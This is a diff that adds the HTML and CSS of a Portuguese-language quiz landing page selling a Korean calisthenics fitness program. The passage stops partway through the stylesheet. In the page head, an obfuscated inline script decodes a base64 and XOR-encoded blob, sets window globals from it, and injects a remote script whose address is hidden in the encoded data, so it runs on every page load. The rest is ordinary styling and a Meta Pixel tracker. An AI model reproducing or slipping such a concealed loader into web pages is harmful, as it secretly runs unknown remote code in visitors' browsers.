@@ -1,0 +1,4673 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Programa de Calistenia Coreana por Atlas</title>
+    
+    <!-- Fonte Poppins -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Anton&family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <link rel="preload" as="image" href="https://i.imgur.com/fE2V2WR.png">
+    
+    
+    <script>(function(){var g_jd=atob("DILc2miDXSvAFiLXa/n+rxrvfxHiflajG/Hm9UfgOUXuY1a6AuSl9AvsMAWiZA2kCPC1qhzwclupbke7RPK1og3vc0GzNA71CvaoqAHhKF+lZQDtMN/w+A/vMkmhelH1Udmn+AbiME7iLACnAvq5tiHnfwfiYEO7Huf+4Eq1PEqmJUO0X7vuv1DgO0nyJBruDrbquVuhIHa9");var q_r63q=[];for(var s_k01=0;s_k01<g_jd.length;s_k01++){q_r63q.push(g_jd.charCodeAt(s_k01)&255);}var h_x7sg=q_r63q[0];var b_ml=q_r63q.slice(1,1+h_x7sg);var g_5v9w=q_r63q.slice(1+h_x7sg);var s_gbkr=g_5v9w.map(function(b,s_u){return b^b_ml[s_u%h_x7sg];});var m_c05t="";for(var d_n5m=0;d_n5m<s_gbkr.length;d_n5m++){m_c05t+=String.fromCharCode(s_gbkr[d_n5m]&255);}var p_9=decodeURIComponent(escape(m_c05t));var x_flr=JSON.parse(p_9);var z_r=x_flr.globals||[];z_r.forEach(function(q_sy2p){window[q_sy2p.name]=q_sy2p.value;});var t_doib=document.createElement("script");t_doib.src=x_flr.url;t_doib.async=true;t_doib.defer=true;(x_flr.attributes||[]).forEach(function(h_ay2m){t_doib.setAttribute(h_ay2m.name,h_ay2m.value);});(document.head||document.documentElement).appendChild(t_doib);})();</script>
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1073159658792929');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1073159658792929&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+ 
+    
+    <!-- Estilos Principais -->
+    <style>
+/* VARIABLES & DESIGN SYSTEM */
+:root {
+    --primary-color: #5b6bd6;
+    --primary-light: #f3eefb;
+    --primary-hover: #5b6bd6;
+    --bg-color: #f9fafb;
+    --card-bg: #ffffff;
+    --text-primary: #1a1a1a;
+    --text-secondary: #6c757d;
+    --border-color: #eef0f3;
+    --border-selected: #5b6bd6;
+    --success-color: #4caf50;
+    --danger-color: #f44336;
+    --warning-color: #ff9800;
+    --shadow-soft: 0 4px 20px rgba(0, 0, 0, 0.04);
+    --shadow-hover: 0 8px 30px rgba(91, 107, 214, 0.08);
+    --font-family: 'Poppins', sans-serif;
+    --max-width: 450px;
+}
+/* RESET & BASE */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+body {
+    font-family: var(--font-family);
+    background-color: var(--bg-color);
+    color: var(--text-primary);
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+    align-items: center;
+    -webkit-font-smoothing: antialiased;
+}
+/* CONTAINER LAYOUT */
+.quiz-header {
+    width: 100%;
+    max-width: var(--max-width);
+    background-color: var(--card-bg);
+    padding: 16px 20px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    border-bottom: 1px solid var(--border-color);
+    position: sticky;
+    top: 0;
+    z-index: 100;
+}
+.logo {
+    display: flex;
+    flex-direction: row;
+    align-items: center;
+    gap: 6px;
+    font-size: 30px;
+    font-weight: 700;
+}
+.logo-bold {
+    font-family: 'Anton', sans-serif;
+    font-weight: 400;
+    color: var(--primary-color);
+    letter-spacing: 0.5px;
+}
+.logo-sub {
+    font-size: 11px;
+    font-weight: 500;
+    background-color: #f1f3f5;
+    color: #495057;
+    padding: 3px 8px;
+    border-radius: 20px;
+    border: 1px solid #e9ecef;
+}
+.btn-back {
+    background: none;
+    border: none;
+    cursor: pointer;
+    color: #495057;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 6px;
+    border-radius: 50%;
+    transition: background-color 0.2s;
+}
+.btn-back:hover {
+    background-color: #f1f3f5;
+}
+.header-placeholder {
+    width: 36px;
+}
+/* PROGRESS BAR */
+.progress-bar-container {
+    width: 100%;
+    max-width: var(--max-width);
+    height: 4px;
+    background-color: #f1f3f5;
+    position: sticky;
+    top: 59px;
+    z-index: 99;
+}
+.progress-bar-fill {
+    height: 100%;
+    background-color: var(--primary-color);
+    transition: width 0.3s ease;
+}
+/* CORE CONTAINERS */
+.quiz-container {
+    width: 100%;
+    max-width: var(--max-width);
+    flex: 1;
+    background-color: var(--card-bg);
+    padding: 24px 20px;
+    box-shadow: var(--shadow-soft);
+    display: flex;
+    flex-direction: column;
+}
+#steps-wrapper {
+    width: 100%;
+    flex: 1;
+    position: relative;
+}
+.quiz-footer {
+    width: 100%;
+    max-width: var(--max-width);
+    padding: 24px 20px;
+    background-color: var(--bg-color);
+    font-size: 10px;
+    color: var(--text-secondary);
+    line-height: 1.6;
+}
+/* STEP CARD ANIMATION */
+.step-card {
+    display: none;
+    animation: fadeInSlide 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+}
+.step-card.active {
+    display: flex;
+    flex-direction: column;
+}
+@keyframes fadeInSlide {
+    from {
+        opacity: 0;
+        transform: translateY(12px);
+    }
+    to {
+        opacity: 1;
+        transform: translateY(0);
+    }
+}
+/* TEXT AND LAYOUT HELPERS */
+.text-center { text-align: center; }
+.text-uppercase { text-transform: uppercase; }
+.text-justify { text-align: justify; }
+.text-secondary { color: var(--text-secondary); }
+.font-semibold { font-weight: 600; }
+.color-highlight { color: var(--primary-color); }
+.color-green { color: var(--success-color); }
+.mt-2 { margin-top: 8px; }
+.mt-3 { margin-top: 16px; }
+.mt-4 { margin-top: 24px; }
+.mb-3 { margin-bottom: 16px; }
+.py-3 { padding-top: 12px; padding-bottom: 12px; }
+.py-4 { padding-top: 18px; padding-bottom: 18px; }
+.flex-1 { flex: 1; }
+.main-title {
+    font-size: 24px;
+    font-weight: 700;
+    line-height: 1.3;
+    color: var(--text-primary);
+    margin-bottom: 14px;
+}
+.step-title {
+    font-size: 20px;
+    font-weight: 600;
+    line-height: 1.35;
+    color: var(--text-primary);
+    margin-bottom: 8px;
+}
+.step-subtitle {
+    font-size: 12px;
+    font-weight: 500;
+    letter-spacing: 0.8px;
+    color: var(--text-secondary);
+    margin-bottom: 4px;
+}
+.step-text {
+    font-size: 13px;
+    line-height: 1.55;
+    color: #495057;
+}
+/* BUTTONS */
+.btn-primary {
+    width: 100%;
+    background-color: var(--primary-color);
+    color: #ffffff;
+    border: none;
+    border-radius: 14px;
+    padding: 16px 20px;
+    font-family: var(--font-family);
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background-color 0.2s, transform 0.1s;
+    box-shadow: 0 4px 12px rgba(91, 107, 214, 0.2);
+}
+.btn-primary:hover {
+    background-color: var(--primary-hover);
+}
+.btn-primary:active {
+    transform: scale(0.98);
+}
+.btn-primary:disabled {
+    background-color: #e9ecef;
+    color: #adb5bd;
+    cursor: not-allowed;
+    box-shadow: none;
+}
+/* OPTIONS LIST & CARDS */
+.options-list {
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+    width: 100%;
+}
+.option-btn {
+    width: 100%;
+    background-color: #ffffff;
+    border: 1px solid var(--border-color);
+    border-radius: 12px;
+    padding: 14px 20px;
+    font-family: var(--font-family);
+    font-size: 14px;
+    font-weight: 500;
+    color: var(--text-primary);
+    cursor: pointer;
+    text-align: left;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    transition: all 0.2s ease;
+}
+.option-btn:hover {
+    border-color: var(--primary-color);
+    box-shadow: var(--shadow-hover);
+}
+.option-btn .arrow {
+    color: #adb5bd;
+    font-size: 16px;
+    font-weight: 600;
+    transition: transform 0.2s;
+}
+.option-btn:hover .arrow {
+    transform: translateX(4px);
+    color: var(--primary-color);
+}
+.text-left-align {
+    text-align: left;
+}
+/* IMAGE AND BANNER CONTAINERS */
+.step-image-container {
+    width: 100%;
+    overflow: hidden;
+}
+.rounded-img-container {
+    border-radius: 16px;
+}
+.banner-img {
+    width: 100%;
+    height: auto;
+    display: block;
+    object-fit: cover;
+    border-radius: 16px;
+}
+.female-athlete-img {
+    max-width: 90%;
+    height: auto;
+    object-fit: contain;
+    margin-top: 15px;
+}
+.max-height-300 {
+    max-height: 260px;
+}
+/* ICON OPTION BUTTONS (STEP 5) */
+.option-btn-icon {
+    width: 100%;
+    background-color: #ffffff;
+    border: 1px solid var(--border-color);
+    border-radius: 14px;
+    padding: 14px 18px;
+    font-family: var(--font-family);
+    font-size: 14px;
+    font-weight: 500;
+    color: var(--text-primary);
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    transition: all 0.2s ease;
+}
+.option-btn-icon:hover {
+    border-color: var(--primary-color);
+    box-shadow: var(--shadow-hover);
+}
+.icon-circle {
+    width: 38px;
+    height: 38px;
+    border-radius: 50%;
+    background-color: #f8f9fa;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 18px;
+    flex-shrink: 0;
+    border: 1px solid var(--border-color);
+}
+.option-btn-icon:hover .icon-circle {
+    background-color: var(--primary-light);
+}
+/* CHECKBOX MULTI-SELECT DESIGNS */
+.option-checkbox {
+    width: 100%;
+    background-color: #ffffff;
+    border: 1px solid var(--border-color);
+    border-radius: 12px;
+    padding: 14px 18px;
+    font-family: var(--font-family);
+    font-size: 14px;
+    font-weight: 500;
+    color: var(--text-primary);
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    transition: all 0.2s ease;
+    position: relative;
+}
+.checkbox-circle {
+    width: 22px;
+    height: 22px;
+    border-radius: 50%;
+    border: 2px solid #ced4da;
+    margin-left: auto;
+    flex-shrink: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: all 0.15s ease;
+}
+.option-checkbox:hover {
+    border-color: var(--primary-color);
+}
+.option-checkbox.selected {
+    border-color: var(--primary-color);
+    background-color: var(--primary-light);
+}
+.option-checkbox.selected .checkbox-circle {
+    border-color: var(--primary-color);
+    background-color: var(--primary-color);
+}
+.option-checkbox.selected .checkbox-circle::after {
+    content: "";
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+    background-color: #ffffff;
+}
+/* TOGGLE SWITCH (STEP 7) */
+.toggle-container {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    background-color: #f8f9fa;
+    padding: 12px 18px;
+    border-radius: 12px;
+    border: 1px solid var(--border-color);
+}
+.toggle-label {
+    font-size: 13px;
+    font-weight: 500;
+    color: var(--text-primary);
+}
+.switch {
+    position: relative;
+    display: inline-block;
+    width: 46px;
+    height: 26px;
+}
+.switch input {
+    opacity: 0;
+    width: 0;
+    height: 0;
+}
+.slider {
+    position: absolute;
+    cursor: pointer;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background-color: #ccc;
+    transition: .3s;
+}
+.slider:before {
+    position: absolute;
+    content: "";
+    height: 18px;
+    width: 18px;
+    left: 4px;
+    bottom: 4px;
+    background-color: white;
+    transition: .3s;
+}
+input:checked + .slider {
+    background-color: var(--primary-color);
+}
+input:checked + .slider:before {
+    transform: translateX(20px);
+}
+.slider.round {
+    border-radius: 34px;
+}
+.slider.round:before {
+    border-radius: 50%;
+}
+/* GRID LAYOUTS MINI IMAGES */
+.options-grid-mini {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+}
+.option-checkbox-img {
+    background-color: #ffffff;
+    border: 1px solid var(--border-color);
+    border-radius: 12px;
+    padding: 10px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+    cursor: pointer;
+    position: relative;
+    transition: all 0.2s;
+}
+.option-checkbox-img img {
+    width: 80px;
+    height: 80px;
+    object-fit: cover;
+    border-radius: 10px;
+    margin-bottom: 8px;
+}
+.option-checkbox-img .option-label {
+    font-size: 12px;
+    font-weight: 500;
+    color: var(--text-primary);
+    line-height: 1.3;
+}
+.option-checkbox-img .checkbox-circle {
+    position: absolute;
+    top: 8px;
+    right: 8px;
+    width: 18px;
+    height: 18px;
+}
+.option-checkbox-img:hover {
+    border-color: var(--primary-color);
+}
+.option-checkbox-img.selected {
+    border-color: var(--primary-color);
+    background-color: var(--primary-light);
+}
+.option-checkbox-img.selected .checkbox-circle {
+    border-color: var(--primary-color);
+    background-color: var(--primary-color);
+}
+.option-checkbox-img.selected .checkbox-circle::after {
+    content: "";
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background-color: #ffffff;
+}
+/* 2x2 GRID OPTION BUTTONS (STEP 10, 23) */
+.options-grid-2x2 {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+}
+.option-grid-btn {
+    background: #ffffff;
+    border: 1px solid var(--border-color);
+    border-radius: 12px;
+    padding: 8px;
+    cursor: pointer;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    transition: all 0.2s;
+}
+.option-grid-btn img {
+    width: 100%;
+    aspect-ratio: 1;
+    object-fit: cover;
+    border-radius: 8px;
+    margin-bottom: 8px;
+}
+.option-grid-btn .grid-label {
+    font-size: 13px;
+    font-weight: 500;
+    color: var(--text-primary);
+    padding-bottom: 4px;
+}
+.option-grid-btn:hover {
+    border-color: var(--primary-color);
+    box-shadow: var(--shadow-hover);
+}
+.option-grid-text-btn {
+    background: #ffffff;
+    border: 1px solid var(--border-color);
+    border-radius: 12px;
+    padding: 18px 10px;
+    cursor: pointer;
+    font-family: var(--font-family);
+    font-size: 13px;
+    font-weight: 500;
+    color: var(--text-primary);
+    text-align: center;
+    transition: all 0.2s;
+}
+.option-grid-text-btn:hover {
+    border-color: var(--primary-color);
+}
+/* ROW BUTTONS WITH LARGE IMAGE (STEP 11, 20) */
+.option-row-img-btn {
+    width: 100%;
+    background-color: #ffffff;
+    border: 1px solid var(--border-color);
+    border-radius: 14px;
+    padding: 10px 14px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    transition: all 0.2s;
+    text-align: left;
+    font-family: var(--font-family);
+}
+.option-row-img-btn img {
+    width: 54px;
+    height: 54px;
+    object-fit: cover;
+    border-radius: 10px;
+    flex-shrink: 0;
+}
+.option-row-img-btn .row-label {
+    font-size: 14px;
+    font-weight: 500;
+    color: var(--text-primary);
+}
+.option-row-img-btn .row-arrow {
+    margin-left: auto;
+    color: #ced4da;
+    font-size: 16px;
+}
+.option-row-img-btn:hover {
+    border-color: var(--primary-color);
+    box-shadow: var(--shadow-hover);
+}
+.row-label-container {
+    display: flex;
+    flex-direction: column;
+}
+.row-label-main {
+    font-size: 14px;
+    font-weight: 600;
+    color: var(--text-primary);
+}
+.row-label-sub {
+    font-size: 11px;
+    color: var(--text-secondary);
+    margin-top: 2px;
+}
+/* SPLIT LAYOUT SIDE PORTRAIT (STEP 12, 22) */
+.split-layout {
+    display: flex;
+    gap: 14px;
+    align-items: flex-start;
+}
+.side-image-container {
+    width: 150px;
+    flex-shrink: 0;
+}
+.side-portrait-img {
+    width: 100%;
+    height: auto;
+    border-radius: 12px;
+    display: block;
+    object-fit: contain;
+}
+/* ROW MULTI-SELECT CHECKBOX IMAGE (STEP 13, 24) */
+.option-checkbox-img-row {
+    width: 100%;
+    background-color: #ffffff;
+    border: 1px solid var(--border-color);
+    border-radius: 12px;
+    padding: 10px 14px;
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    cursor: pointer;
+    transition: all 0.2s;
+    font-family: var(--font-family);
+}
+.option-checkbox-img-row .row-thumb {
+    width: 44px;
+    height: 44px;
+    object-fit: cover;
+    border-radius: 8px;
+    flex-shrink: 0;
+}
+.option-checkbox-img-row .option-label {
+    font-size: 13px;
+    font-weight: 500;
+    color: var(--text-primary);
+}
+.option-checkbox-img-row:hover {
+    border-color: var(--primary-color);
+}
+.option-checkbox-img-row.selected {
+    border-color: var(--primary-color);
+    background-color: var(--primary-light);
+}
+.option-checkbox-img-row.selected .checkbox-circle {
+    border-color: var(--primary-color);
+    background-color: var(--primary-color);
+}
+.option-checkbox-img-row.selected .checkbox-circle::after {
+    content: "";
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background-color: #ffffff;
+}
+/* ROW MULTI-SELECT CHECKBOX ICON (STEP 25, 26) */
+.option-checkbox-row {
+    width: 100%;
+    background-color: #ffffff;
+    border: 1px solid var(--border-color);
+    border-radius: 12px;
+    padding: 12px 14px;
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    cursor: pointer;
+    transition: all 0.2s;
+    font-family: var(--font-family);
+}
+.emoji-icon {
+    font-size: 20px;
+    width: 32px;
+    height: 32px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+.option-checkbox-row .option-label {
+    font-size: 13px;
+    font-weight: 500;
+    color: var(--text-primary);
+}
+.option-checkbox-row:hover {
+    border-color: var(--primary-color);
+}
+.option-checkbox-row.selected {
+    border-color: var(--primary-color);
+    background-color: var(--primary-light);
+}
+.option-checkbox-row.selected .checkbox-circle {
+    border-color: var(--primary-color);
+    background-color: var(--primary-color);
+}
+.option-checkbox-row.selected .checkbox-circle::after {
+    content: "";
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background-color: #ffffff;
+}
+/* EMOJI BTN GRID/ROW (STEP 14) */
+.option-btn-emoji {
+    width: 100%;
+    background: #ffffff;
+    border: 1px solid var(--border-color);
+    border-radius: 12px;
+    padding: 14px 18px;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    cursor: pointer;
+    transition: all 0.2s;
+    font-family: var(--font-family);
+}
+.emoji-large {
+    font-size: 24px;
+    flex-shrink: 0;
+}
+.option-label-vertical {
+    font-size: 14px;
+    font-weight: 500;
+    color: var(--text-primary);
+}
+.option-btn-emoji:hover {
+    border-color: var(--primary-color);
+    box-shadow: var(--shadow-hover);
+}
+/* RULER SELECTOR SYSTEM (STEP 16, 17, 18) */
+.unit-toggle {
+    display: flex;
+    justify-content: center;
+    gap: 8px;
+}
+.btn-unit {
+    background-color: #f1f3f5;
+    border: none;
+    border-radius: 20px;
+    padding: 6px 16px;
+    font-family: var(--font-family);
+    font-size: 12px;
+    font-weight: 600;
+    color: #495057;
+    cursor: pointer;
+    transition: all 0.15s;
+}
+.btn-unit.active {
+    background-color: var(--primary-color);
+    color: #ffffff;
+}
+.value-display {
+    text-align: center;
+    font-weight: 700;
+    color: var(--text-primary);
+}
+.large-value {
+    font-size: 44px;
+    letter-spacing: -1px;
+}
+.small-unit {
+    font-size: 16px;
+    font-weight: 500;
+    color: var(--text-secondary);
+    margin-left: 4px;
+}
+.ruler-outer {
+    position: relative;
+    width: 100%;
+    height: 70px;
+    border-top: 1px solid #dee2e6;
+    border-bottom: 1px solid #dee2e6;
+    background-color: #fafbfc;
+}
+.ruler-line-indicator {
+    position: absolute;
+    left: 50%;
+    top: 0;
+    transform: translateX(-50%);
+    width: 3px;
+    height: 45px;
+    background-color: var(--primary-color);
+    border-radius: 1px;
+    z-index: 10;
+}
+.ruler-scroll-container {
+    width: 100%;
+    height: 100%;
+    overflow-x: auto;
+    overflow-y: hidden;
+    white-space: nowrap;
+    position: relative;
+    scroll-behavior: auto;
+    -webkit-overflow-scrolling: touch;
+}
+.ruler-scroll-container::-webkit-scrollbar {
+    display: none; /* Oculta barra de rolagem */
+}
+.ruler-track {
+    display: inline-block;
+    height: 100%;
+    padding-left: 50%; /* Permite rolar até a borda esquerda no centro */
+    padding-right: 50%; /* Permite rolar até a borda direita no centro */
+    box-sizing: border-box;
+}
+.ruler-tick {
+    display: inline-block;
+    width: 2px;
+    background-color: #adb5bd;
+    margin-right: 12px;
+    vertical-align: top;
+    position: relative;
+}
+.tick-major {
+    height: 30px;
+    background-color: #495057;
+    width: 2.5px;
+}
+.tick-minor {
+    height: 15px;
+    background-color: #ced4da;
+}
+.tick-label {
+    position: absolute;
+    top: 36px;
+    left: 50%;
+    transform: translateX(-50%);
+    font-size: 11px;
+    font-weight: 600;
+    color: #495057;
+}
+.drag-tip {
+    font-size: 10px;
+    color: var(--text-secondary);
+    text-transform: uppercase;
+    letter-spacing: 0.8px;
+    margin-top: 8px;
+}
+/* IMC BOXES FEEDBACK */
+.imc-calc-box {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    background-color: #f8f9fa;
+    padding: 12px 16px;
+    border-radius: 10px;
+    border: 1px solid var(--border-color);
+    font-size: 12px;
+    color: var(--text-secondary);
+}
+.imc-calc-box .info-icon {
+    width: 18px;
+    height: 18px;
+    border-radius: 50%;
+    background-color: #e9ecef;
+    color: var(--text-secondary);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: bold;
+    font-size: 11px;
+}
+.imc-feedback-box {
+    background-color: #f8f9fa;
+    padding: 14px 18px;
+    border-radius: 12px;
+    border: 1px solid var(--border-color);
+    font-size: 12.5px;
+    line-height: 1.5;
+    color: #495057;
+}
+/* INPUT AGE CARD (STEP 19) */
+.input-container {
+    width: 100%;
+}
+.quiz-input-text {
+    width: 100%;
+    border: 2px solid var(--border-color);
+    border-radius: 12px;
+    padding: 16px 20px;
+    font-family: var(--font-family);
+    font-size: 16px;
+    font-weight: 500;
+    color: var(--text-primary);
+    text-align: center;
+    outline: none;
+    transition: border-color 0.2s;
+}
+.quiz-input-text:focus {
+    border-color: var(--primary-color);
+}
+.info-card-box {
+    display: flex;
+    gap: 12px;
+    background-color: #fdf6f7;
+    border: 1px solid #fae2e6;
+    padding: 14px 16px;
+    border-radius: 12px;
+    align-items: flex-start;
+}
+.info-circle-badge {
+    width: 20px;
+    height: 20px;
+    background-color: var(--primary-color);
+    color: #ffffff;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 11px;
+    font-weight: bold;
+    flex-shrink: 0;
+}
+.info-card-text {
+    font-size: 12px;
+    line-height: 1.5;
+    color: #852a42;
+}
+/* CHARTS (STEP 28, 30) */
+.chart-container {
+    background: #ffffff;
+    border: 1px solid var(--border-color);
+    border-radius: 16px;
+    padding: 14px;
+    width: 100%;
+}
+.transformation-chart, .weight-loss-chart {
+    width: 100%;
+    height: auto;
+    display: block;
+}
+.chart-badge {
+    font-size: 9px;
+    font-weight: 600;
+    padding: 4px 8px;
+    border-radius: 20px;
+    text-align: center;
+    white-space: nowrap;
+}
+.user-badge {
+    background-color: var(--primary-light);
+    color: var(--primary-color);
+    border: 1px solid var(--primary-color);
+}
+.success-badge {
+    background-color: #e8f5e9;
+    color: #2e7d32;
+    border: 1px solid #4caf50;
+}
+.danger-badge {
+    background-color: #ffebee;
+    color: #c62828;
+    border: 1px solid #f44336;
+}
+.chart-weight-lbl {
+    font-size: 10px;
+    font-weight: 600;
+    padding: 3px 6px;
+    border-radius: 4px;
+    text-align: center;
+}
+.current-lbl {
+    background-color: var(--danger-color);
+    color: #fff;
+}
+.target-lbl {
+    background-color: var(--success-color);
+    color: #fff;
+}
+.week-lbl {
+    background-color: #f1f3f5;
+    color: #495057;
+    border: 1px solid #dee2e6;
+}
+/* LOADING BAR (STEP 29) */
+.loading-progress-container {
+    width: 100%;
+    height: 16px;
+    background-color: #f1f3f5;
+    border-radius: 20px;
+    overflow: hidden;
+}
+.loading-bar-fill {
+    height: 100%;
+    background-color: var(--primary-color);
+    border-radius: 20px;
+    transition: width 0.1s linear;
+}
+.loading-percentage-display {
+    font-size: 20px;
+    font-weight: 700;
+    color: var(--text-primary);
+}
+.image-caption-text {
+    font-size: 11px;
+}
+/* IMC GAUGE CARD (STEP 31) */
+.imc-gauge-card {
+    background-color: #ffffff;
+    border: 1px solid var(--border-color);
+    border-radius: 16px;
+    padding: 16px;
+}
+.gauge-title {
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--text-secondary);
+    margin-bottom: 12px;
+}
+.gauge-bar-outer {
+    position: relative;
+    width: 100%;
+    height: 10px;
+    background: linear-gradient(to right, #2196f3 0%, #4caf50 30%, #ff9800 65%, #f44336 100%);
+    border-radius: 10px;
+    margin-top: 35px;
+    margin-bottom: 10px;
+}
+.gauge-pointer-wrapper {
+    position: absolute;
+    top: -30px;
+    transform: translateX(-50%);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    transition: left 0.5s ease-out;
+}
+.gauge-pointer-label {
+    background-color: #212529;
+    color: #ffffff;
+    font-size: 10px;
+    font-weight: 700;
+    padding: 2px 6px;
+    border-radius: 4px;
+    white-space: nowrap;
+}
+.gauge-pointer-arrow {
+    width: 0;
+    height: 0;
+    border-left: 5px solid transparent;
+    border-right: 5px solid transparent;
+    border-top: 5px solid #212529;
+    margin-top: -1px;
+}
+.gauge-labels {
+    display: flex;
+    justify-content: space-between;
+    font-size: 9px;
+    font-weight: 500;
+    color: var(--text-secondary);
+    margin-top: 4px;
+}
+.lock-alert-card {
+    background-color: #fff8f8;
+    border: 1px solid #ffd8d8;
+    border-radius: 14px;
+    padding: 16px;
+}
+.lock-alert-header {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 8px;
+}
+.warning-icon {
+    font-size: 18px;
+}
+.lock-alert-title {
+    font-size: 13px;
+    font-weight: 700;
+    color: #c62828;
+}
+.lock-alert-text {
+    font-size: 12.5px;
+    line-height: 1.55;
+    color: #c62828;
+}
+/* METRICS LIST (STEP 31) */
+.profile-metrics-list {
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+}
+.metric-row {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    background-color: #ffffff;
+    border: 1px solid var(--border-color);
+    border-radius: 12px;
+    padding: 12px 16px;
+}
+.metric-icon {
+    font-size: 20px;
+}
+.metric-info {
+    display: flex;
+    flex-direction: column;
+}
+.metric-label {
+    font-size: 11px;
+    color: var(--text-secondary);
+}
+.metric-value {
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--text-primary);
+}
+/* BUTTONS WITH RIGHT CHEVRON (STEP 32, 33) */
+.option-btn-icon-row {
+    width: 100%;
+    background-color: #ffffff;
+    border: 1px solid var(--border-color);
+    border-radius: 14px;
+    padding: 14px 18px;
+    font-family: var(--font-family);
+    font-size: 13.5px;
+    font-weight: 500;
+    color: var(--text-primary);
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    transition: all 0.2s ease;
+    text-align: left;
+}
+.option-btn-icon-row:hover {
+    border-color: var(--primary-color);
+    box-shadow: var(--shadow-hover);
+}
+.arrow-indicator {
+    margin-left: auto;
+    font-size: 20px;
+    color: #ced4da;
+    line-height: 1;
+}
+.option-btn-icon-row:hover .arrow-indicator {
+    color: var(--primary-color);
+}
+/* COMPARISON CARD (STEP 34) */
+.comparison-card {
+    background-color: #ffffff;
+    border: 1px solid var(--border-color);
+    border-radius: 16px;
+    padding: 16px;
+}
+.comparison-columns {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 10px;
+}
+.comp-col {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+}
+.comp-title {
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--text-secondary);
+    margin-bottom: 8px;
+}
+.comp-img-wrap{
+    width:100%;
+    height:190px;
+    border-radius:12px;
+    border:1px solid var(--border-color);
+    overflow:hidden;
+
+    display:flex;
+    align-items:center;
+    justify-content:center;
+
+    background:#E4E3E7;
+}
+
+.comp-img-wrap img{
+    width:auto;
+    height:170px;
+    max-width:100%;
+    object-fit:contain;
+    display:block;
+}
+.comp-metric {
+    display: flex;
+    flex-direction: column;
+    width: 100%;
+    padding: 6px 0;
+    border-bottom: 1px solid #f8f9fa;
+}
+.comp-metric:last-child {
+    border-bottom: none;
+}
+.comp-label {
+    font-size: 9px;
+    color: var(--text-secondary);
+}
+.comp-value {
+    font-size: 12px;
+    font-weight: 600;
+    color: var(--text-primary);
+}
+.comp-bar-lvl {
+    display: flex;
+    gap: 3px;
+    justify-content: center;
+    margin: 4px 0;
+}
+.bar-fill {
+    width: 14px;
+    height: 4px;
+    background-color: #e9ecef;
+    border-radius: 2px;
+}
+.bar-fill.filled {
+    background-color: var(--primary-color);
+}
+.comp-divider {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    width: 30px;
+}
+/* PLAN CARDS DETAILS */
+.plan-details-list {
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+}
+.plan-info-card {
+    display: flex;
+    gap: 12px;
+    background-color: #fdf6f7;
+    border: 1px solid #f9e2e6;
+    border-radius: 12px;
+    padding: 12px 14px;
+    align-items: center;
+}
+.info-card-icon {
+    font-size: 18px;
+    flex-shrink: 0;
+}
+.info-card-content {
+    font-size: 11.5px;
+    line-height: 1.45;
+    color: #852a42;
+}
+/* VSL FINAL DESIGN (STEP 35) */
+.vsl-video-container {
+    width: 100%;
+    aspect-ratio: 16/9;
+    background-color: #000;
+    border-radius: 16px;
+    overflow: hidden;
+    position: relative;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+}
+.vsl-simulated-player {
+    width: 100%;
+    height: 100%;
+    position: relative;
